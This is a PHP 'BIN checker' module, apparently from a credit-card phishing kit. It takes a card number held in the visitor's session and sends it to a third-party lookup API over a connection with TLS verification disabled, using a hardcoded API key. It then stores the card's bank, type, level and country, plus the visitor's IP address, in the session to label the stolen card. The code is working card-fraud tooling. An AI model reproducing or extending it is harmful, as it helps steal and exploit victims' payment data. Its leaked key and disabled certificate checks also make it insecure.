<?php

session_start();
error_reporting(0);
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$BIN_LOOKUP  = str_replace(' ', '', $_SESSION['_cardnumber_']);


$url = "https://api.bincodes.com/cc/?format=json&api_key=02246095ef99e11bf5e3433bec008837&cc=$BIN_LOOKUP";

//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3



$Z118_BIN    = @json_decode("$result");


$BIN_CARD    = $Z118_BIN->card;
$BIN_BANK    = $Z118_BIN->bank;
$BIN_TYPE    = $Z118_BIN->type;
$BIN_LEVEL   = $Z118_BIN->level;
$BIN_CNTRCODE= $Z118_BIN->countrycode;
$BIN_WEBSITE = strtolower($Z118_BIN->website);
$BIN_PHONE   = strtolower($Z118_BIN->phone);
$BIN_COUNTRY = $Z118_BIN->country;
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];

?>
